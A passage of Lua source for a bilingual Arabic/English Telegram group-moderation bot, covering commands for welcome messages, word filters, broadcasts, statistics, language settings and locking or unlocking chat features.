                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Get ID status has been change to *Simple* ', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم وضع الايدي بدون صوره •', 1, 'md')
                end
                database:set('getidstatus'..msg.chat_id_,'Simple')
              end
            end
          end
        end
        -------------------------------------faeder----------------------------------------------------------
        if is_sudo(msg) then
          local text = msg.content_.text_:gsub('المغادره التلقائيه','Autoleave')
          if text:match("^[Aa]utoleave (.*)$") then
            local status = {string.match(text, "^([Aa]utoleave) (.*)$")}
            if status[2] == "تفعيل" or status[2] == "on" then
              if database:get('autoleave') == "On" then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Auto Leave is now active ', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم تفعيل المغادره التلقائيه فعلا •', 1, 'md')
                end
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Auto Leave has been actived ', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم تفعيل المغادره التلقائيه •', 1, 'md')
                end
                database:set('autoleave','On')
              end
            end
            if status[2] == "تعطيل" or status[2] == "off" then
              if database:get('autoleave') == "Off" then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Auto Leave is now deactive ', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم تعطيل المغادره التلقائيه فعلا •', 1, 'md')
                end
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Auto leave has been deactived ', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم تعطيل المغادره التلقائيه •', 1, 'md')
                end
                database:set('autoleave','Off')
              end
            end
          end
          ---------------------------------faeder--------------------------------------------------------------
          local text = msg.content_.text_:gsub('رد الخاص','Clerk')
          if text:match("^[Cc]lerk (.*)$") then
            local status = {string.match(text, "^([Cc]lerk) (.*)$")}
            if status[2] == "تفعيل" or status[2] == "on" then
              if database:get('clerk') == "On" then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Clerk is now active ', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم تفعيل رد خاص البوت فعلا •', 1, 'md')
                end
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Clerk has been actived ', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم تفعيل رد خاص البوت •', 1, 'md')
                end
                database:set('clerk','On')
              end
            end
            if status[2] == "تعطيل" or status[2] == "off" then
              if database:get('clerk') == "Off" then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Clerk is now deactive ', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم تعطيل رد الخاص فعلا •', 1, 'md')
                end
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Auto leave has been deactived ', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم تعطيل رد خاص البوت •', 1, 'md')
                end
                database:set('clerk','Off')
              end
            end
          end
        end
        ---------------------------------------------faeder--------------------------------------------------
        if is_momod(msg.sender_user_id_, msg.chat_id_) then
          if text:match("^[Ss]etlink$") or text:match("^ضع رابط$")  then
            if database:get('lang:gp:'..msg.chat_id_) then
              faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Plese send your group link now :', 1, 'md')
            else
              faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ ارسل رابط المجموعه ليتم حفضه 📥 ', 1, 'md')
            end
            database:set("bot:group:link"..msg.chat_id_, 'waiting')
          end
          ------------------------------------faeder-----------------------------------------------------------
         
        --------
        if is_momod(msg.sender_user_id_, msg.chat_id_) and idf:match("-100(%d+)") and (text:match("^[Ss]upport$") or text:match("^الدعم$")) then
          local link = database:get("bot:supports:link")
          if link then
            if link:match("https://") then
              if database:get("lang:gp:" .. msg.chat_id_) then
                faederdx(msg.chat_id_, msg.id_, 1, "🚦⁞ <b>Support Link</b> :\n\n " .. link, 1, "html")
              else
                faederdx(msg.chat_id_, msg.id_, 1, "🚦⁞ رابط كروب دعم البوت •\n\n " .. link, 1, "html")
              end
            elseif database:get("lang:gp:" .. msg.chat_id_) then
              faederdx(msg.chat_id_, msg.id_, 1, "🚦⁞ <b>Support Bot ID</b> : @" .. link, 1, "html")
            else
              faederdx(msg.chat_id_, msg.id_, 1, "️🚦⁞ بوت تواصل دعم البوت 🚨\n@" .. link, 1, "html")
            end
          elseif database:get("lang:gp:" .. msg.chat_id_) then
            faederdx(msg.chat_id_, msg.id_, 1, "🚦⁞ *Support link* is not found ", 1, "md")
          else
            faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ لم يتم تعيين دعم ارسل لي (ضع دعم) واتبع التعليمات 📥', 1, 'md')
          end
        end
        ----------------------------------------faeder-------------------------------------------------------
        if is_momod(msg.sender_user_id_, msg.chat_id_) then
          if text:match("^[Ww]elcome on$") or text:match("^تفعيل الترحيب$") then
            if database:get('lang:gp:'..msg.chat_id_) then
              faederdx(msg.chat_id_, msg.id_, 1, ' 🚦⁞  Welcome activated • ', 1, 'md')
            else
              faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم تفعيل الترحيب •', 1, 'md')
            end
            database:set("bot:welcome"..msg.chat_id_,true)
          end
          if text:match("^[Ww]elcome off$") or text:match("^تعطيل الترحيب$") then
            if database:get('lang:gp:'..msg.chat_id_) then
              faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Welcome deactivated ', 1, 'md')
            else
              faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم تعطيل الترحيب •', 1, 'md')
            end
            database:del("bot:welcome"..msg.chat_id_)
          end
          if text:match("^ضع ترحيب (.*)$")  then
            local welcome = {string.match(text, "^(ضع ترحيب) (.*)$")}
            if database:get('lang:gp:'..msg.chat_id_) then
              faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Welcome text has been saved \n\n🚦⁞  Welcome text :\n\n'..welcome[2], 1, 'html')
            else
              faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم حفض الترحيب •\n\n🚦⁞ الترحيب هو  :\n\n'..welcome[2], 1, 'md')
            end
            database:set('welcome:'..msg.chat_id_,welcome[2])
          end
          if text:match("^[Dd]el welcome$") or text:match("^حذف الترحيب$") then
            if database:get('lang:gp:'..msg.chat_id_) then
              faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Welcome text has been removed •', 1, 'md')
            else
              faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم حذف الترحيب •', 1, 'md')
            end
            database:del('welcome:'..msg.chat_id_)
          end
          if text:match("^[Gg]et welcome$") or text:match("^جلب الترحيب$") then
            local wel = database:get('welcome:'..msg.chat_id_)
            if wel then
              faederdx(msg.chat_id_, msg.id_, 1, wel, 1, 'md')
            else
              if database:get('lang:gp:'..msg.chat_id_) then
                faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Welcome text not found •', 1, 'md')
              else
                faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ لم يتم وضع الترحيب •', 1, 'md')
              end
            end
          end
        end
        --------------------------------------------faeder---------------------------------------------------
        if is_sudo(msg) then
		  local text = msg.content_.text_:gsub('ضع رد الخاص','Set clerk')
          if text:match("^[Ss]et clerk (.*)$") then
            local clerk = {string.match(text, "^([Ss]et clerk) (.*)$")}
            if database:get('lang:gp:'..msg.chat_id_) then
              faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Clerk text has been saved •\n🚦⁞ Welcome text :\n\n'..clerk[2], 1, 'md')
            else
              faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم تعيين رد الخاص للبوت •\n\n🚦⁞ رد خاص البوت هو :\n\n'..clerk[2], 1, 'md')
            end
            database:set('textsec',clerk[2])
          end
          if text:match("^[Dd]el clerk$") or text:match("^حذف رد الخاص$") then
            if database:get('lang:gp:'..msg.chat_id_) then
              faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Clerk text has been removed •', 1, 'md')
            else
              faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم حذف رد الخاص •',1, 'md')
            end
            database:del('textsec')
          end
          if text:match("^[Gg]et clerk$") or text:match("^جلب رد الخاص$") then
            local cel = database:get('textsec')
            if cel then
              faederdx(msg.chat_id_, msg.id_, 1, cel, 1, 'md')
            else
              if database:get('lang:gp:'..msg.chat_id_) then
                faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Clerk text not found •', 1, 'md')
              else
                faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ لم يتم وضع رد للخاص ارسل (ضع رد الخاص) ليتم حفظه 📥', 1, 'md')
              end
            end
          end
        end
        -------------------------------------faeder----------------------------------------------------------
        if text:match("^[Aa]ction (.*)$") and is_sudo(msg) then
          local lockpt = {string.match(text, "^([Aa]ction) (.*)$")}
          if lockpt[2] == "typing" then
            sendaction(msg.chat_id_, 'Typing')
          end
          if lockpt[2] == "video" then
            sendaction(msg.chat_id_, 'RecordVideo')
          end
          if lockpt[2] == "voice" then
            sendaction(msg.chat_id_, 'RecordVoice')
          end
          if lockpt[2] == "photo" then
            sendaction(msg.chat_id_, 'UploadPhoto')
          end
        end
        ------------------------------------faeder-----------------------------------------------------------
        if is_momod(msg.sender_user_id_, msg.chat_id_) then
          if text:match("^[Ff]ilter (.*)$") or text:match("^منع (.*)$") then
            local filters = {string.match(text, "^([Ff]ilter) (.*)$")}
            local filterss = {string.match(text, "^(منع) (.*)$")}
            local name = string.sub(filters[2] or filterss[2], 1, 50)
            local hash = 'bot:filters:'..msg.chat_id_
            database:hset(hash, name,'newword')
            if database:get('lang:gp:'..msg.chat_id_) then
              faederdx(msg.chat_id_, msg.id_, 1, "🚦⁞  Word [ "..name.." ] has been filtered •", 1, 'md')
            else
              faederdx(msg.chat_id_, msg.id_, 1, "🔖|| الكلمه [ "..name.." ]\n🔊|| تم منعها ✅", 1, 'md')
            end
          end
        end
        --------------------------------------faeder---------------------------------------------------------
        if is_momod(msg.sender_user_id_, msg.chat_id_) then
          if text:match("^[Uu]nfilter (.*)$") or text:match("^الغاء منع (.*)$") then
            local rws = {string.match(text, "^([Uu]nfilter) (.*)$")}
            local rwss = {string.match(text, "^(الغاء منع) (.*)$")}
            local name = string.sub(rws[2] or rwss[2], 1, 50)
            local cti = msg.chat_id_
            local hash = 'bot:filters:'..msg.chat_id_
            if not database:hget(hash, name)then
              if database:get('lang:gp:'..msg.chat_id_) then
                faederdx(msg.chat_id_, msg.id_, 1, "🚦⁞ Word : ["..name.."] is not in filterlist •", 1, 'md')
              else
                faederdx(msg.chat_id_, msg.id_, 1, "🔖|| الكلمه [ "..name.." ]\n🚦|| هي غير ممنوعه في المجموعه ✅", 1, 'md')
              end
            else
              if database:get('lang:gp:'..msg.chat_id_) then
                faederdx(msg.chat_id_, msg.id_, 1, "🚦⁞ Word : ["..name.."] removed from filterlist •", 1, 'md')
              else
                faederdx(msg.chat_id_, msg.id_, 1, "🔖|| الكلمه [ "..name.." ]\n🔊|| تم الغاء منعها ✅", 1, 'md')
              end
              database:hdel(hash, name)
            end
          end
        end
        ------------------------------------faeder-----------------------------------------------------------
        if is_momod(msg.sender_user_id_, msg.chat_id_) then
          if text:match("^[Ff]ilteer all (.*)$") or text:match("^فلتر عام (.*)$") then
            local filters = {string.match(text, "^([Ff]Filteer all) (.*)$")}
            local filterss = {string.match(text, "^(فلتر عام) (.*)$")}
            local name = string.sub(filters[2] or filterss[2], 1, 50)
            local hash = 'bot:freewords:'
            database:hset(hash, name,'newword')
            if database:get('lang:gp:'..msg.chat_id_) then
              faederdx(msg.chat_id_, msg.id_, 1, "🚦⁞ Word [ "..name.." ]\n🚦⁞ has been filtered all ☑️", 1, 'html')
            else
              faederdx(msg.chat_id_, msg.id_, 1, "🚦⁞ الكلمه [ "..name.." ]\n🚦⁞ تم منعها عام ☑️", 1, 'html')
            end
          end
        end
        --------------------------------------faeder---------------------------------------------------------
        if is_momod(msg.sender_user_id_, msg.chat_id_) then
          if text:match("^[Uu]nfilter all (.*)$") or text:match("^الغاء منع عام (.*)$") then
            local rws = {string.match(text, "^([Uu]nfilter all) (.*)$")}
            local rwss = {string.match(text, "^(الغاء منع عام) (.*)$")}
            local name = string.sub(rws[2] or rwss[2], 1, 50)
            local cti = msg.chat_id_
            local hash = 'bot:freewords:'
            if not database:hget(hash, name)then
              if database:get('lang:gp:'..msg.chat_id_) then
                faederdx(msg.chat_id_, msg.id_, 1, "🚦⁞ Word [ "..name.." ]\n🚦⁞ is not in filtered all ☑️", 1, 'html')
              else
                faederdx(msg.chat_id_, msg.id_, 1, "🚦⁞ الكلمه [ "..name.." ]\n🚦⁞ هي ليست ممنوعه عام ☑️", 1, 'html')
              end
            else
              if database:get('lang:gp:'..msg.chat_id_) then
                faederdx(msg.chat_id_, msg.id_, 1, "🚦⁞ Word [ "..name.." ]\n🚦⁞ removed from filtered all ☑️", 1, 'html')
              else
                faederdx(msg.chat_id_, msg.id_, 1, "🚦⁞ الكلمه [ "..name.." ]\n🚦⁞ تم الغاء منعها عام ☑️", 1, 'html')
              end
              database:hdel(hash, name)
            end
          end
        end
        ---------------------------------------------faeder--------------------------------------------------
        if text:match("^اذاعه (.*)$") and is_admin(msg.sender_user_id_, msg.chat_id_) then
          local gps = database:scard("bot:groups") or 0
          local gpss = database:smembers("bot:groups") or 0
          local rws = {string.match(text, "^([Bb]roadcast) (.*)$")}
          local rwss = {string.match(text, "^(اذاعه) (.*)$")}
          local bib = rws[2] or rwss[2]
          for i=1, #gpss do
            faederdx(gpss[i], 0, 1, bib, 1, 'md')
          end
          if database:get('lang:gp:'..msg.chat_id_) then
            faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Your Message send to :{ '..gps..' } groups •', 1, 'md')
          else
            faederdx(msg.chat_id_, msg.id_, 1, '🎈|| تم نشر رسالتك ✔️\n🔘|| في : { '..gps..' } مجموعه 💠 ', 1, 'md')
          end
        end
        ------------------------------------faeder-----------------------------------------------------------
        if text:match("^[Ss]tats$") or text:match("^الاحصائيات$") and is_admin(msg.sender_user_id_, msg.chat_id_) then
          local gps = database:scard("bot:groups")
          local users = database:scard("bot:userss")
          local allmgs = database:get("bot:allmsgs")
          if database:get('autoleave') == "On" then
            autoleaveen = "Active"
            autoleavear = "مفعل 🚩"
          elseif database:get('autoleave') == "Off" then
            autoleaveen = "Deactive"
            autoleavear = "معطل 📍"
          elseif not database:get('autoleave') then
            autoleaveen = "Deactive"
            autoleavear = "معطل 📍"
          end
		  if database:get('clerk') == "On" then
            clerken = "Active"
            clerkar = "مفعل 🚩"
          elseif database:get('clerk') == "Off" then
            clerken = "Deactive"
            clerkar = "معطل 📍"
          elseif not database:get('clerk') then
            clerken = "Deactive"
            clerkar = "معطل 📍"
          end
          if database:get('lang:gp:'..msg.chat_id_) then
            faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Status 🗂 \n\n🎖⁞ Groups • '..gps..'\n\n👥⁞ Users • '..users..' \n\n📬⁞ Msg received • '..allmgs..'\n\n🎙⁞ Auto Leave • '..autoleavear..'\n\n💢⁞ Clerk • '..clerkar, 1, 'md')
          else
            faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ احصائيات البوت 🗂 \n\n🎖⁞ عدد الكروبات • '..gps..'\n\n👥⁞ عدد الاعضاء • '..users..' \n\n📬⁞ عدد كل رسائل المجموعات • '..allmgs..'\n\n🚧⁞ المغادره التلقائيه • '..autoleavear..'\n\n💢⁞ رد الخاص • '..clerkar, 1, 'md')
          end
        end
        ---------------------------------------faeder---------------------------------------
        if text:match("^[Rr]esgp$") or text:match("^تنظيف الكروبات$") and is_admin(msg.sender_user_id_, msg.chat_id_) then
          if database:get('lang:gp:'..msg.chat_id_) then
            faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Nubmper of groups bot has been update •', 1, 'md')
          else
            faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم تنظيف الكروبات الوهميه •', 'md')
          end
          database:del("bot:groups")
        end
        ------------------------------------------------------------------------------
        if text:match("^[Nn]amegp$") or text:match("^اسم المجموعه$") and is_momod(msg.sender_user_id_, msg.chat_id_) then
          faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ اسم المجموعه هو • '..chat.title_, 1, 'md')
        end
        -----------------------------------------------------------------------------------------------
        if text:match("^[Rr]esmsg$") or text:match("^تنظيف الرسائل$") and is_sudo(msg) then
          database:del("bot:allmsgs")
          if database:get('lang:gp:'..msg.chat_id_) then
            faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ All msg received has been reset •', 1, 'md')
          else
            faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم تنظيف عدد رسائل الكروبات •', 'md')
          end
        end
        --------------------------------------------faeder---------------------------------------------------
        if text:match("^[Ss]etlang (.*)$") or text:match("^ضع اللغه (.*)$") and is_owner(msg.sender_user_id_, msg.chat_id_) then
          local langs = {string.match(text, "^(.*) (.*)$")}
          if langs[2] == "ar" or langs[2] == "العربيه" then
            if not database:get('lang:gp:'..msg.chat_id_) then
              faederdx(msg.chat_id_, msg.id_, 1, '🖱⁞ تم وضع اللغه العربيه مسبقا •', 1, 'md')
            else
              faederdx(msg.chat_id_, msg.id_, 1, '🖱⁞ تم وضع اللغه العربيه في المجموعه •', 1, 'md')
              database:del('lang:gp:'..msg.chat_id_)
            end
          end
          if langs[2] == "en" or langs[2] == "الانكليزيه" then
            if database:get('lang:gp:'..msg.chat_id_) then
              faederdx(msg.chat_id_, msg.id_, 1, '🖱⁞ *Language Bot is already English* •', 1, 'md')
            else
              faederdx(msg.chat_id_, msg.id_, 1, '🖱⁞ *Language Bot has been changed to English* •', 1, 'md')
              database:set('lang:gp:'..msg.chat_id_,true)
            end
          end
        end
        ---------------------------------faeder--------------------------------------------------------------
        if is_momod(msg.sender_user_id_, msg.chat_id_) then
          if text:match("^[Uu]nlock (.*)$") or text:match("^فتح (.*)$") then
            local unlockpt = {string.match(text, "^([Uu]nlock) (.*)$")}
            if is_leaderid(msg.sender_user_id_) then
              tar = 'المطور ✨'
            elseif is_sudoid(msg.sender_user_id_) then
              tar = 'المطور ✨'
            elseif is_admin(msg.sender_user_id_) then
              tar = 'المطور ✨'
              elseif is_onall(msg.sender_user_id_) then
              tar = 'المدير ✨'
              elseif is_moall(msg.sender_user_id_) then
              tar = 'الادمن ✨'
              elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
              tar = 'المنشئ ✨'
            elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
              tar = 'المدير ✨'
            elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
              tar = 'الادمن ✨'          
            end
            local unlockpts = {string.match(text, "^(فتح) (.*)$")}
            if unlockpt[2] == "edit" or unlockpts[2] == "التعديل" then
              if database:get('editmsg'..msg.chat_id_) then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been unlock edit ☑️', 1, 'md')
                else
                  local faeder = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم فتح التعديل • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 57, string.len(msg.sender_user_id_))
                end
                database:del('editmsg'..msg.chat_id_)
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ edit is already unlocked ✔️', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم فتح التعديل سابقا ✔️', 1, 'md')
                end
              end
            end
            if unlockpt[2] == "cmd" or unlockpts[2] == "الشارحه" then
              if database:get('bot:cmds'..msg.chat_id_) then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been unlock cmd ☑️', 1, 'md')
                else
                  local faeder = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم فتح الشارحه • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 57, string.len(msg.sender_user_id_))
                end
                database:del('bot:cmds'..msg.chat_id_)
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ cmd is already unlocked ✔️', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم فتح الشارحه سابقا ✔️', 1, 'md')
                end
              end
            end
            if unlockpt[2] == "bots" or unlockpts[2] == "البوتات" then
              if database:get('bot:bots:mute'..msg.chat_id_) then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been unlock bots ☑️', 1, 'md')
                else
                  local faeder = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم فتح البوتات • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 57, string.len(msg.sender_user_id_))
                end
                database:del('bot:bots:mute'..msg.chat_id_)
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ bots is already unlocked ✔️', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم فتح البوتات سابقا ✔️', 1, 'md')
                end
              end
            end
            if unlockpt[2] == "bots ban" or unlockpts[2] == "البوتات بالطرد" then
              if database:get('bot:bots:ban'..msg.chat_id_) then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been unlock bots ban☑️', 1, 'md')
                else
                  local faeder = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم فتح البوتات بالطرد • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 64, string.len(msg.sender_user_id_))
                end
                database:del('bot:bots:ban'..msg.chat_id_)
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ bots is already unlocked ban ✔️', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم فتح البوتات بالطرد سابقا ✔️', 1, 'md')
                end
              end
            end
            if unlockpt[2] == "bots keed" or unlockpts[2] == "البوتات بالتقييد" then
              if database:get('keed_bots'..msg.chat_id_) then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been unlock bots keed ☑️', 1, 'md')
                else
                  local faeder = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم فتح البوتات بالتقييد • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 66, string.len(msg.sender_user_id_))
                end
                database:del('keed_bots'..msg.chat_id_)
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ bots is already unlocked keed ✔️', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم فتح البوتات بالتقييد سابقا ✔️', 1, 'md')
                end
              end
            end
            if unlockpt[2] == "flood" or unlockpts[2] == "التكرار" then
              if database:get('anti-flood:'..msg.chat_id_) then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been unlock flood ☑️', 1, 'md')
                else
                  local faeder = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم فتح التكرار • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 57, string.len(msg.sender_user_id_))
                end
                database:del('anti-flood:'..msg.chat_id_)
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ flood is already unlocked ✔️', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم فتح التكرار سابقا ✔️', 1, 'md')
                end
              end
            end
            if unlockpt[2] == "pin" or unlockpts[2] == "التثبيت" then
              if database:get('bot:pin:mute'..msg.chat_id_) then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been unlock pin ☑️', 1, 'md')
                else
                  local faeder = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم فتح التثبيت • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 57, string.len(msg.sender_user_id_))
                end
                database:del('bot:pin:mute'..msg.chat_id_)
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ pin is already unlocked ✔️', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم فتح التثبيت سابقا ✔️', 1, 'md')
                end
              end
            end
          end
        end
        ------------------------------------faeder-----------------------------------------------------------
        if is_momod(msg.sender_user_id_, msg.chat_id_) then
          if text:match("^[Ll]ock gtime (%d+)$") then
            local mutept = {string.match(text, "^[Ll]ock gtime (%d+)$")}
            local hour = string.gsub(mutept[1], 'h', '')
            local num1 = tonumber(hour) * 3600
            local num = tonumber(num1)
            database:setex('bot:muteall'..msg.chat_id_, num, true)
            if database:get('lang:gp:'..msg.chat_id_) then
              faederdx(msg.chat_id_, msg.id_, 1, "🚦⁞ Lock all has been enable for "..mutept[1].." hours •", 'md')
            else
              faederdx(msg.chat_id_, msg.id_, 1, "🚦⁞ تم قفل الكل لمده "..mutept[1].." ساعه •", 'md')
            end
          end
          if text:match("^قفل الكل بالساعات (%d+)$") then
            local mutept = {string.match(text, "^قفل الكل بالساعات (%d+)$")}
            local hour = string.gsub(mutept[1], 'h', '')
            local num1 = tonumber(hour) * 3600
            local num = tonumber(num1)
            database:setex('bot:muteall'..msg.chat_id_, num, true)
            if database:get('lang:gp:'..msg.chat_id_) then
              faederdx(msg.chat_id_, msg.id_, 1, "🚦⁞ Lock all has been enable for "..mutept[1].." hours •", 'md')
            else
              faederdx(msg.chat_id_, msg.id_, 1, "🚦⁞ تم قفل الكل لمده "..mutept[1].." ساعه •", 'md')
            end
          end
        end
        -----------------------------------------faeder------------------------------------------------------
        if is_momod(msg.sender_user_id_, msg.chat_id_) then
          if text:match("^[Ll]ock (.*)$") or text:match("^قفل (.*)$") then
            local mutept = {string.match(text, "^([Ll]ock) (.*)$")}
            if is_leaderid(msg.sender_user_id_) then
              tar = 'المطور ✨'
            elseif is_sudoid(msg.sender_user_id_) then
              tar = 'المطور ✨'
            elseif is_admin(msg.sender_user_id_) then
              tar = 'المطور ✨'
              elseif is_onall(msg.sender_user_id_) then
              tar = 'المدير ✨'
              elseif is_moall(msg.sender_user_id_) then
              tar = 'الادمن ✨'
              elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
              tar = 'المنشئ ✨'
            elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
              tar = 'المدير ✨'
            elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
              tar = 'الادمن ✨'          
            end
            local mutepts = {string.match(text, "^(قفل) (.*)$")}
            if mutept[2] == "all" or  mutepts[2] == "الكل" then
              if not database:get('bot:muteall'..msg.chat_id_) then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been lock all ☑️', 1, 'md')
                else
                  local faeder = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم قفل كل الوسائط • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 60, string.len(msg.sender_user_id_))
                end
                database:set('bot:muteall'..msg.chat_id_,true)
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ all is already locked ✔️', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم قفل كل الوسائط سابقا ✔️', 1, 'md')
                end
              end
            end
            if mutept[2] == "text" or mutepts[2] == "الدردشه" then
              if not database:get('bot:text:mute'..msg.chat_id_) then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been lock text ☑️', 1, 'md')
                else
                  local faeder = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم قفل الدردشه • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 57, string.len(msg.sender_user_id_))
                end
                database:set('bot:text:mute'..msg.chat_id_,true)
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ text is already locked ✔️', 1, 'md')
                else
